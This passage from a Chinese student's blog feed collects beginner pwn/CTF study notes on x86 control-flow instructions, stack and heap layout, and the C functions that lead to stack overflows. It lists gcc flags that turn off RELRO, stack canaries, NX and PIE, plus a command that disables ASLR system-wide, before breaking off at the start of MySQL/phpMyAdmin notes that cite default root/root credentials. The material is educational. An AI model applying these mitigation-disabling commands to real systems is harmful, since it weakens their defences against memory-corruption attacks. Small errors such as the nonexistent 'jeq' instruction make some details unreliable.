title="控制流指令"></a>控制流指令</h2><p>x86处理器维护一个指令指针（IP）寄存器，它是一个32位值，指示当前指令在内存中的起始位置。通常，在执行一条指令后，它会递增以指向内存中的下一条指令的起始位置。IP寄存器不能直接操作，而是由提供的控制流指令隐式更新。</p><blockquote><p>我们使用符号&lt;LABEL&gt;来表示代码中已标记的位置。通过输入标签名称后跟冒号，可以在x86汇编代码中的任意位置插入标签。</p></blockquote><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">       mov esi, [ebp+8]<br>begin: xor ecx, ecx<br>       mov eax, [esi]<br></code></pre></td></tr></table></figure><p>此代码段中的第二条指令被标记为begin。在代码的其他地方，我们可以使用更方便的符号名称begin来引用此指令所在的内存中的位置。这个标签只是表示位置的一种方便方式，而不是它的32位值。</p><h4 id="jmp-跳转"><a href="#jmp-跳转" class="headerlink" title="jmp-跳转"></a>jmp-跳转</h4><p>将程序控制流转移到操作对象指示的内存位置上</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp &lt;label&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp begin ; 跳到标记为begin的指令位置<br></code></pre></td></tr></table></figure><h4 id="jcondition-条件跳转"><a href="#jcondition-条件跳转" class="headerlink" title="jcondition-条件跳转"></a>jcondition-条件跳转</h4><p>这些指令是基于一组条件码状态判断是否进行跳转，该条件码被存储在称为机器状态字的特殊寄存器中。</p><p>机器状态字的内容包括有关上次执行的算术运算的信息。例如，此字的某一比特位表示最后结果是否为零，某另一个比特位指示上次结果是否为负数。</p><p>基于这些条件码，可以执行多个条件跳转。例如，如果上次算术运算的结果为零，则JZ指令执行到指定操作对象标签的跳转。否则，控制按顺序前进到下一条指令。</p><p>许多条件分支的名字都是根据上一次执行的特殊比较指令cmp命名的。例如，条件分支（如JLE和JNE）基于首先对所需操作对象执行cmp操作。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">je &lt;label&gt;  ; 相等时跳转<br>jne &lt;label&gt; ; 不相等时跳转<br>jz &lt;label&gt;  ; 最后结果为零时跳转<br>jg &lt;label&gt;  ; 大于时跳转<br>jge &lt;label&gt; ; 大于等于时跳转<br>jl &lt;label&gt;  ; 小于时跳转<br>jle &lt;label&gt; ; 小于等于时跳转<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax, ebx<br>jle done ; 如果EAX的中的值小于或等于EBX中的值，跳至标签done。否则，继续执行下一条指令<br></code></pre></td></tr></table></figure><h4 id="cmp-比较"><a href="#cmp-比较" class="headerlink" title="cmp-比较"></a>cmp-比较</h4><p>比较两个指定操作对象的值，适当设置机器状态字中的条件代码。此指令等同于sub指令，不同之处在于将丢弃减法结果，而不是替换第一个操作对象。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp &lt;reg&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;mem&gt;<br>cmp &lt;mem&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp DWORD PTR [var], 10<br>jeq loop ; 如果存储在var中的4个字节的值等于4字节整数常量10，则跳转到标记为loop的位置<br></code></pre></td></tr></table></figure><h4 id="call-ret-子程序调用和返回"><a href="#call-ret-子程序调用和返回" class="headerlink" title="call, ret-子程序调用和返回"></a>call, ret-子程序调用和返回</h4><p>这些指令实现一个子程序调用和返回。</p><p>call指令首先将当前代码位置压入到内存中硬件支持的堆栈中，然后无条件跳转到标签操作对象指示的代码位置。与简单的跳转指令不同，call指令保存当前位置，并在子程序完成时返回到此处。</p><p>ret指令实现子程序返回机制。此指令首先从硬件支持的内存堆栈中弹出代码位置，然后无条件跳转至该代码位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call &lt;label&gt;<br>ret<br></code></pre></td></tr></table></figure><hr><p>最近一直被问x86学完了没，这算学完叭（小声bb)🤨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>x86汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在PWN的边缘疯狂试探</title>
    <link href="/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/"/>
    <url>/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>一点点 pwn 基础——栈和堆、汇编基础和Linux常用保护机制</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>PWN是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似”砰”，对黑客而言，这就是成功实施黑客攻击的声音–砰的一声，被”黑”的电脑或手机就被你操纵了 。</p><p>（上文来自百度）</p><p>个人认为解决PWN题就是利用简单的逆向得到代码，从代码中发现漏洞，再通过二进制或系统调用等方式利用这些漏洞获得目标主机的shell 。</p><p>很酷！！！！！😎</p><h1 id="前知知识"><a href="#前知知识" class="headerlink" title="前知知识"></a>前知知识</h1><p>就是我只知道这么多就来学pwn了</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>寄存器是CPU内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。</p><p>我们常常看到 32位 CPU、64位 CPU 这样的名称，其实指的就是寄存器的大小。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/271639137915732.jpg"></p><p>在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。</p><p>编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用.</p><p>例如<code>mov $5, %eax</code>或<code>mov eax, 5</code>表示将5赋值给寄存器<strong>eax</strong>。</p><p> 不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母<strong>“e”</strong>作名称前缀，指示寄存器大小为32位；x86_64架构用字母<strong>“r”</strong>作名称前缀，指示各寄存器大小为64位。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出就是数据会占用一个存储空间，但是我们写代码的时候默认输入数据就是符合规定的数据，并没有对输入数据进行限制，这时超出这个空间大小的数据就会输入到合法空间以外的地方并造成破坏。</p><p>借此我们就可以控制这个不允许用户操作的空间内的寄存器，改变寄存器的值达到代码执行的效果。</p><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><p>输入：</p><ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul><p>输出：</p><ul><li>sprintf</li></ul><p>字符串：</p><ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul><h3 id="Linux的一些基础命令"><a href="#Linux的一些基础命令" class="headerlink" title="Linux的一些基础命令"></a>Linux的一些基础命令</h3><p><code>sudo</code> ：SuperUserDo 在需要权限的命令前使用</p><p><code>apt-get</code>：可以执行安装、升级、甚至移除软件这类任务</p><p><code>grep</code>：配合正则表达式食用，用于寻找文件或内容</p><p><code>cat</code>：查看文件</p><p><code>rm</code>：移除文件，还可以使用**-r**来进行递归移除，从而移除整个文件夹</p><p><code>cp</code>：拷贝文件</p><p><code>ls</code>：查看目录下的文件</p><p><del>暂时只想起这么多</del></p><h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><blockquote><p>pwn 研究二进制还是要学习底层计算机语言的😢</p></blockquote><p>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是 <code>ADD</code>。</p><h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><h4 id="段"><a href="#段" class="headerlink" title="段"></a>段</h4><p>一般情况下，程序都是由bss段，text段和date段三个段组成。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/11.png"></p><p>bss 段：只有定义而没有赋初值的全局变量和静态变量。</p><p>data 段：存放在编译阶段 (而非运行时) 就能确定的数据，可读可写。就是通常所说的<strong>静态存储区</strong>，存储赋了初值的全局变量和赋初值的静态变量以及常量。</p><p>text 段：放<strong>程序代码</strong>，在编译时确定，只读。</p><h5 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h5><p>bss段是用来存放未初始化的全局变量和静态变量的一块内存区域，一般在初始化时bss段部分会清零。</p><h5 id="text段"><a href="#text段" class="headerlink" title=".text段"></a>.text段</h5><p>存放程序代码的区域，在编译时确定，只读。</p><p>更进一步讲是存放处理器的机器指令，当各个源文件单独编译之后生成目标文件，经连接器连接各个目标文件并解决各个源文件之间的函数引用。与此同时，还要将所有目标文件中的.text段合在一起，但不是简单的将他们“堆”在一起，还要处理各个段之间函数引用问题。</p><h5 id="date段"><a href="#date段" class="headerlink" title=".date段"></a>.date段</h5><p>用于存放在编译阶段（而非运行时）就能确定的数据，可读可写。也是通常所说的静态存储区，赋了初值的全局变量，常量和静态变量都存放在这个区域。</p><h4 id="Heap-堆"><a href="#Heap-堆" class="headerlink" title="Heap-堆"></a>Heap-堆</h4><p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址(低位），结束地址是较大的那个地址（高位）。</p><p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用<code>malloc</code>命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分。</p><blockquote><p>实际上，起始地址会有一段静态数据，这里忽略</p></blockquote><p>举例来说，用户要求得到10个字节内存，那么从起始地址<code>0x1000</code>开始给他分配，一直分配到地址<code>0x100A</code>，如果再要求得到22个字节，那么就分配到<code>0x1020</code>。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-38-37.png"></p><p>这种因为用户主动请求而划分出来的内存区域，就叫做 Heap（堆）。它由<strong>起始地址</strong>开始，从<strong>低位</strong>向<strong>高位</strong>增长。Heap 的一个重要特点就是<strong>不会自动消失</strong>，必须手动释放，或者由垃圾回收机制来回收。</p><h4 id="Strack-栈"><a href="#Strack-栈" class="headerlink" title="Strack-栈"></a>Strack-栈</h4><p>Stack 是由于函数运行而临时占用的内存区域。Stack 是由内存区域的<strong>结束地址</strong>开始，从<strong>高位</strong>向<strong>低位</strong>分配。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。</p><p>比如，内存区域的结束地址是<code>0x8000</code>，第一帧假定是16字节，那么下一次分配的地址就会从<code>0x7FF0</code>开始；第二帧假定需要64字节，那么地址就会移动到<code>0x7FB0</code>。</p><p>举个具体的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> add_a_and_b(a,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码中，系统开始执行<code>main</code>函数时，会为它在内存里面建立一个帧（frame），所有<code>main</code>的内部变量（比如a和b）都保存在这个帧里面。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-50-18.png"></p><p>当调用其他函数时，程序运行到这一行，会新建一个帧。此时存在两个帧：<code>main</code>和<code>add_a_and_b</code>。一般来说，调用栈有多少层，就有多少帧。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-49-52.png"></p><p>等到<code>add_a_and_b</code>运行结束，它的帧就会被回收，系统会回到函数<code>main</code>刚才中断执行的地方，继续往下执行。</p><p>生成新的帧，叫做”压栈”，英文是 push；栈的回收叫做”出栈”，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做”<strong>后进先出</strong>“的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。</p><h4 id="一个🌰"><a href="#一个🌰" class="headerlink" title="一个🌰"></a>一个🌰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add_a_and_b</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>   <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-keyword">return</span> add_a_and_b(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将其转换为汇编语言就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs x86">.file&quot;test.c&quot;<br>.text<br>.globladd_a_and_b<br>.typeadd_a_and_b, @function<br>add_a_and_b:<br>.LFB0:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl%edi, -4(%rbp)<br>movl%esi, -8(%rbp)<br>movl-4(%rbp), %edx<br>movl-8(%rbp), %eax<br>addl%edx, %eax<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE0:<br>.sizeadd_a_and_b, .-add_a_and_b<br>.globlmain<br>.typemain, @function<br>main:<br>.LFB1:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl$3, %esi<br>movl$2, %edi<br>calladd_a_and_b<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE1:<br>.sizemain, .-main<br>.ident&quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609&quot;<br>.section.note.GNU-stack,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><blockquote><p>以我现在的水平还不是很能看明白，我就是把文件全复制下来了</p></blockquote><p>简化以后主要就是这些内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86">_add_a_and_b:<br>   push   %ebx<br>   mov    %eax, [%esp+8] <br>   mov    %ebx, [%esp+12]<br>   add    %eax, %ebx <br>   pop    %ebx <br>   ret  <br><br>_main:<br>   push   3<br>   push   2<br>   call   _add_a_and_b <br>   add    %esp, 8<br>   ret<br></code></pre></td></tr></table></figure><p>可以看到原程序两个函数<code>add_a_and_b</code>和<code>main</code>对应上面的两个标签<code>_add_a_and_b</code>和<code>_main</code>，每个标签里面是该函数所转成的 CPU 运行流程，每一行就是 CPU 执行的一次操作。</p><p>以其中一行为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86">push   %ebx<br></code></pre></td></tr></table></figure><p>这一行里面，<code>push</code>是 CPU 指令，<code>%ebx</code>是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。</p><h4 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h4><table><thead><tr><th>汇编指令</th><th>实际作用</th><th>等价代码</th></tr></thead><tbody><tr><td>mov rax,rbx</td><td>用于赋值</td><td>rax&#x3D;rbx</td></tr><tr><td>add&#x2F;sub rax,rbx</td><td>用于加&#x2F;减法</td><td>rax+&#x3D;rbx&#x2F;rax-&#x3D;rbx</td></tr><tr><td>and&#x2F;xor&#x2F;or rax,rbx</td><td>用于与&#x2F;异或&#x2F;或</td><td>rax&amp;&#x3D;rbx&#x2F;rax^&#x3D;rbx&#x2F;rax</td></tr><tr><td>push rax</td><td>压栈</td><td>rsp-&#x3D;8;*rsp&#x3D;rax</td></tr><tr><td>pop rax</td><td>出栈</td><td>rax&#x3D;*rsp;rsp+&#x3D;8</td></tr><tr><td>call rax</td><td>调用函数</td><td>push rip;jmp rax;</td></tr><tr><td>ret</td><td>从函数返回</td><td>pop rip;</td></tr><tr><td>cmp rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax-rbx</td></tr><tr><td>test rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax&amp;rbx</td></tr></tbody></table><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><table><thead><tr><th>汇编指令示例</th><th>英文全称</th><th>实际作用</th></tr></thead><tbody><tr><td>jmp</td><td>jump</td><td>跳转</td></tr><tr><td>jz</td><td>jump if zero</td><td>为0时跳转</td></tr><tr><td>jnz</td><td>jump if not zero</td><td>不为零时跳转</td></tr><tr><td>jg</td><td>jump if greater</td><td>有符号数大于跳转</td></tr><tr><td>jl</td><td>jump if lsee</td><td>有符号数小于跳转</td></tr></tbody></table><p>跳转指令不同于 mov 指令，他可以用于修改段寄存器 cs、ip 的值，从而修改 CPU 在内存中所读取的内容的地址。</p><p><del>表格是从小卓的博客copy来的</del></p><h1 id="Linux常用保护机制"><a href="#Linux常用保护机制" class="headerlink" title="Linux常用保护机制"></a>Linux常用保护机制</h1><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了 保护机制</p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>这不是个保护机制是个脚本软件。</p><p>checksec用来检查可执行文件的属性，查看文件开启了哪些保护机制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">checksec [filename]<br></code></pre></td></tr></table></figure><p>以之前一道 Pwn 题题目为例：<br><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_21-08-51.png"></p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>RELRO即为read only relocation，可以理解为我们熟悉的windows系统里的只读。</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。</p><h4 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o hello test.c // 默认情况下，是Partial RELRO<br>gcc -z norelro -o hello test.c // 关闭，即No RELRO<br>gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO<br>gcc -z now -o hello test.c // 全部开启，即Full RELRO<br></code></pre></td></tr></table></figure><h3 id="CANNARY（栈保护）"><a href="#CANNARY（栈保护）" class="headerlink" title="CANNARY（栈保护）"></a>CANNARY（栈保护）</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当启用栈保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。</p><p>在 Linux 中我们将 cookie 信息称为 canary。</p><h4 id="参数设置-1"><a href="#参数设置-1" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护<br>gcc -fstack-protector-all 启用保护，为所有函数插入保护<br>gcc -fstack-protector-strong<br>gcc -fstack-protector-explicit 只对有明确stack_protect attribute 的函数开启保护<br>gcc -fno-stack-protector 禁用保护<br></code></pre></td></tr></table></figure><h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX(DEP)"></a>NX(DEP)</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>NX 即 No-eXecute（不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h4 id="参数设置-2"><a href="#参数设置-2" class="headerlink" title="参数设置"></a>参数设置</h4><p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 - z execstack 参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c                    // 默认情况下，开启NX保护<br>gcc -z execstack -o test test.c        // 禁用NX保护<br>gcc -z noexecstack -o test test.c    // 开启NX保护<br></code></pre></td></tr></table></figure><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><h4 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h4><p>PIE即Position-Independent Executable（ 位置无关可执行文件），与ASLR 技术类似。</p><p>ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关，即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。</p><p>这就意味着，在 PIE 和 ASLR 同时开启的情况下，攻击者将对程序的内存布局一无所知，传统的改写GOT 表项的方法也难以进行，因为攻击者不能获得程序的.got 段的虚地址。</p><p>liunx 下关闭 PIE 的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><h4 id="参数设置-3"><a href="#参数设置-3" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c       // 默认情况下，不开启PIE<br>gcc -fpie -pie -o test test.c        // 开启PIE，此时强度为1<br>gcc -fPIE -pie -o test test.c        // 开启PIE，此时为最高强度2<br>gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIE<br>gcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE<br></code></pre></td></tr></table></figure><hr><p>杂七杂八忙了一个周，抽时间学了这么点东西。我是菜鸡🥬</p><p>有看几道pwn题，发现大部分题目都是需要一些逆向技巧的，有些还会和web结合 <del>非常疯狂</del></p><p>如果有空web一些基础的东西我还是会继续学的，就熬夜吧熬夜吧🤪</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ubuntu</tag>
      
      <tag>x86汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL数据库基础</title>
    <link href="/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>又名：学了就忘只能再看从头重学😣</p><span id="more"></span><h1 id="01-phpstudy中MySQL的简单使用"><a href="#01-phpstudy中MySQL的简单使用" class="headerlink" title="01 phpstudy中MySQL的简单使用"></a>01 phpstudy中MySQL的简单使用</h1><p>在学用MySQL的时候发现自己和学习资料用的不是同一个集成环境，所以打开方式不一样，这种小问题还是难不倒我哒😎</p><p>首先开启MySQL服务    <del>好了接下来就不会了</del></p><p>再去小皮官网看看</p><p>有一个模块是phpMyAdmin的使用。按照官方教程下载好打开我才发现这是在网页上操作，不是命令行。没关系，下载都下载了，学习一下。</p><h4 id="001-图形化界面操作"><a href="#001-图形化界面操作" class="headerlink" title="001 图形化界面操作"></a>001 图形化界面操作</h4><p>在软件管理找到<strong>phpMyAdmin</strong>，点击下载。下载完之后点管理就会自动在浏览器打开，输入用户名和密码就可以使用啦。</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-29-51.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong></p><p>在phpMyAdmin也可以用SQL查询语句嗷</p><blockquote><p>输入SELECT id FROM test ;</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-48-13.png"></p><p>使用其他界面操作内容时也可以预览SQL语句</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-51-03.png"></p><p>总之就是很简单易上手辣😇</p><p><del>连我都可以无师自通</del></p><h4 id="002-cmd操作"><a href="#002-cmd操作" class="headerlink" title="002 cmd操作"></a>002 cmd操作</h4><blockquote><p>MySQL在phpstudy_pro文件下的Extensions文件夹里</p></blockquote><p>进入bin目录后在此处打开cmd</p><p>输入<code>mysql -u[用户名] -p[密码] -h [数据库服务器地址]</code>进入</p><p><img 